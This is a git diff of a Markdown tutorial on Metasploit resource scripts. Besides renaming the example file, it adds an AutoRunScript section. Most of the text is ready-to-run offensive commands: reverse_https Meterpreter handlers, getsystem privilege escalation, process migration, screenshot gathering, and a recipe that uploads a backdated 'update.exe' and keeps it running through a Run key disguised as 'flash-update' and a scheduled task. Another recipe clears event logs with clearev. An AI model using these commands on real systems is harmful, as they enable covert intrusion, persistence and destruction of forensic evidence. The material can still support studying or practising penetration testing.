@@ -6,10 +6,10 @@
 
 | article chapters | jump links | command syntax |
 |-------|---|---|
-| how to run resource scripts?| [how to run resource scripts](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md#how-to-run-resource-scripts) | msfconsole -r my_resource_file.rc |
-| how to write resource scripts? | [how to write resource scripts](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md#how-to-write-resource-scripts) | makerc /root/my_resource_file.rc | 
+| how to run resource scripts?| [how to run resource scripts](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md#how-to-run-resource-scripts) | msfconsole -r script.rc |
+| how to write resource scripts? | [how to write resource scripts](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md#how-to-write-resource-scripts) | makerc /root/script.rc | 
 | RC scripts in post exploitation | [resource scripts in post exploitation](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md#resource-scripts-in-post-exploitation) | run migrate -n explorer.exe |
-| RC scripts in AutoRunScript | [resource scripts in AutoRunScript](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md#resource-scripts-in-autorunscript) | set AutoRunScript /root/my_resource_file.rc |
+| RC scripts in AutoRunScript | [resource scripts in AutoRunScript](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md#resource-scripts-in-autorunscript) | set AutoRunScript /root/script.rc |
 | using ruby (ERB scripting) | [using ruby in RC (ERB scripting)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md#using-ruby-in-rc-erb-scripting) | \<ruby\>framework.db.hosts.each do \|h\|\</ruby\> |
 | exercises with resource scripts | [exercises with resource scripts](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md#exercises) | exercises external links |
 
@@ -30,10 +30,10 @@
 ##  HOW TO RUN RESOURCE SCRIPTS?
 <blockquote>You can run resource scripts from msfconsole or from the web interface. Before you can run a resource script, you need to identify the required parameters that need to be configured for the script to run. If you're a Metasploit Framework user, you can run a resource script from msfconsole or meterpreter prompt with the resource command or you can run a resource script when you start msfconsole with the -r flag from msfconsole.</blockquote>
 
-      msfconsole -r my_resource_file.rc
-      msfconsole -r /root/my_resource_file.rc
-      msf > resource /root/my_resource_file.rc
-      meterpreter > resource /root/my_resource_file.rc
+      msfconsole -r script.rc
+      msfconsole -r /root/script.rc
+      msf > resource /root/script.rc
+      meterpreter > resource /root/script.rc
 
 #### [!] [Jump to article index](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md#metasploit-resource-files)
 
@@ -46,18 +46,18 @@
 
 - **Create a resource file to display the version number of metasploit (manually)::**`[bash prompt]`<br />
 
-      touch my_resource_file.rc
-      echo 'version' > my_resource_file.rc
+      touch script.rc
+      echo 'version' > script.rc
 
-    `[run]` msfconsole -r /root/my_resource_file.rc
+    `[run]` msfconsole -r /root/script.rc
 
 - **Create a resource file to display the version number of metasploit (makerc)::**`[metasploit prompt]`<br />
 
       kali > msfconsole
       msf > version
-      msf > makerc /root/my_resource_file.rc
+      msf > makerc /root/script.rc
 
-    `[run]` msf > resource /root/my_resource_file.rc
+    `[run]` msf > resource /root/script.rc
 
 <br /><br />
 
@@ -65,16 +65,16 @@
 
 - **Create a resource file using bash terminal prompt::**`[bash prompt]`<br />
 
-      touch my_resource_file.rc
+      touch script.rc
 
-         echo 'use exploit/multi/handler' > my_resource_file.rc
-         echo 'set PAYLOAD windows/meterpreter/reverse_https' >> my_resource_file.rc
-         echo 'set LHOST 192.168.1.71' >> my_resource_file.rc
-         echo 'set LPORT 666' >> my_resource_file.rc
-         echo 'set ExitOnSession false' >> my_resource_file.rc
-         echo 'exploit' >> my_resource_file.rc
+         echo 'use exploit/multi/handler' > script.rc
+         echo 'set PAYLOAD windows/meterpreter/reverse_https' >> script.rc
+         echo 'set LHOST 192.168.1.71' >> script.rc
+         echo 'set LPORT 666' >> script.rc
+         echo 'set ExitOnSession false' >> script.rc
+         echo 'exploit' >> script.rc
 
-    `[run]` msfconsole -r /root/my_resource_file.rc
+    `[run]` msfconsole -r /root/script.rc
 
 - **Create a resource file using the core command 'makerc'::**`[metasploit prompt]`<br />
 
@@ -86,9 +86,9 @@
       msf exploit(multi/handler) > set ExitOnSession false
       msf exploit(multi/handler) > exploit
 
-      msf exploit(multi/handler) > makerc /root/my_resource_file.rc
+      msf exploit(multi/handler) > makerc /root/script.rc
 
-    `[run]` msf > resource /root/my_resource_file.rc
+    `[run]` msf > resource /root/script.rc
 
 <br />
 
@@ -103,16 +103,16 @@
 
 - **Resource script to elevate session, take screenshot, migrate and run post-modules::**`[bash prompt]`<br />
 
-      touch my_resource_file.rc
+      touch script.rc
 
-        echo 'getprivs' > my_resource_file.rc
-        echo 'getsystem' >> my_resource_file.rc
-        echo 'screenshot -v -p IClass.jpeg -v true' >> my_resource_file.rc
-        echo 'run migrate -n wininit.exe' >> my_resource_file.rc
-        echo 'run post/windows/gather/enum_applications' >> my_resource_file.rc
-        echo 'run post/multi/recon/local_exploit_suggester' >> my_resource_file.rc
+        echo 'getprivs' > script.rc
+        echo 'getsystem' >> script.rc
+        echo 'screenshot -v -p IClass.jpeg -v true' >> script.rc
+        echo 'run migrate -n wininit.exe' >> script.rc
+        echo 'run post/windows/gather/enum_applications' >> script.rc
+        echo 'run post/multi/recon/local_exploit_suggester' >> script.rc
 
-     `[run]` meterpreter > resource /root/my_resource_file.rc
+     `[run]` meterpreter > resource /root/script.rc
 
 <br /><br />
 
@@ -120,25 +120,25 @@
 
 - **Resource script to elevate session, migrate, persiste payload and clear tracks::**`[bash prompt]`<br />
 
-      touch my_resource_file.rc
+      touch script.rc
 
-        echo 'getprivs' > my_resource_file.rc
-        echo 'getsystem' >> my_resource_file.rc
-        echo 'run migrate -n explorer.exe' >> my_resource_file.rc
-        echo 'upload update.exe %temp%\\update.exe' >> my_resource_file.rc
-        echo "timestomp -z '3/10/1999 15:15:15' %temp%\\update.exe" >> my_resource_file.rc
-        echo 'reg setval -k HKLM\\Software\\Microsoft\\Windows\\Currentversion\\Run -v flash-update -d %temp%\\update.exe' >> my_resource_file.rc
-        echo 'run scheduleme -m 10 -c "%temp%\\update.exe"' >> my_resource_file.rc
+        echo 'getprivs' > script.rc
+        echo 'getsystem' >> script.rc
+        echo 'run migrate -n explorer.exe' >> script.rc
+        echo 'upload update.exe %temp%\\update.exe' >> script.rc
+        echo "timestomp -z '3/10/1999 15:15:15' %temp%\\update.exe" >> script.rc
+        echo 'reg setval -k HKLM\\Software\\Microsoft\\Windows\\Currentversion\\Run -v flash-update -d %temp%\\update.exe' >> script.rc
+        echo 'run scheduleme -m 10 -c "%temp%\\update.exe"' >> script.rc
         clearev
 
-     `[run]` meterpreter > resource /root/my_resource_file.rc
+     `[run]` meterpreter > resource /root/script.rc
 
 <br />
 
 
 - **Handler::AutoRunScript::**`[bash prompt]`<br />
 
-      sudo msfconsole -x 'use exploit/multi/handler; set LHOST 192.168.1.71; set LPORT 666; set PAYLOAD windows/meterpreter/reverse_https; set AutoRunScript multi_command -rc /root/my_resource_file.rc; exploit'
+      sudo msfconsole -x 'use exploit/multi/handler; set LHOST 192.168.1.71; set LPORT 666; set PAYLOAD windows/meterpreter/reverse_https; set AutoRunScript multi_console_command -rc /root/script.rc; exploit'
 
 <br />
 
@@ -149,10 +149,30 @@
 <br /><br /><br />
 
 ## RESOURCE SCRIPTS IN AutoRunScript
+<blockquote>This next example demonstrates how we can auto-run our resource script automatically at session creation with the help of @darkoperator 'post/multi/gather/multi_command.rb' and msfconsole handler AutoRunScript flag, for this to work we need to define a global variable (setg <option>) to call our resource script at session creation.</blockquote>
 
-- **RC::AutoRunScript::**`[resource_script.rc]`<br />
+- **RC::Post-Exploit::Script::**`[gather.rc]`<br />
 
-      set AutoRunScript /root/my_resource_file.rc
+      touch gather.rc
+
+         echo 'sysinfo' > /root/gather.rc
+         echo 'getuid' >> /root/gather.rc
+         echo 'screenshot' >> /root/gather.rc
+
+- **RC::AutoRunScript::**`[script.rc]`<br />
+
+      touch script.rc
+
+         echo 'setg resource /root/gather.rc' > script.rc
+         echo 'use exploit/multi/handler' >> script.rc
+         echo 'set PAYLOAD windows/meterpreter/reverse_https' >> script.rc
+         echo 'set LHOST 192.168.1.71' >> script.rc
+         echo 'set LPORT 666' >> script.rc
+         echo 'set ExitOnSession false' >> script.rc
+         echo 'set AutoRunScript post/multi/gather/multi_command.rb' >> script.rc
+         echo 'exploit' >> script.rc
+
+     `[run]` msfconsole > resource -r /root/script.rc
 
 <br />
 
@@ -175,7 +195,7 @@
          </ruby>
       run
 
-     `[run]` msfconsole > resource -r /root/my_resource_file.rc
+     `[run]` msfconsole > resource -r /root/script.rc
 
 <br />
 
@@ -213,7 +233,7 @@
       end
       </ruby>
 
-     `[run]` msfconsole > resource -r /root/my_resource_file.rc
+     `[run]` msfconsole > resource -r /root/script.rc
 
 <br />
 
@@ -249,7 +269,7 @@
           self.run_single("run")
       </ruby>
 
-     `[run]` msfconsole > resource -r /root/my_resource_file.rc
+     `[run]` msfconsole > resource -r /root/script.rc
 
 <br />
 
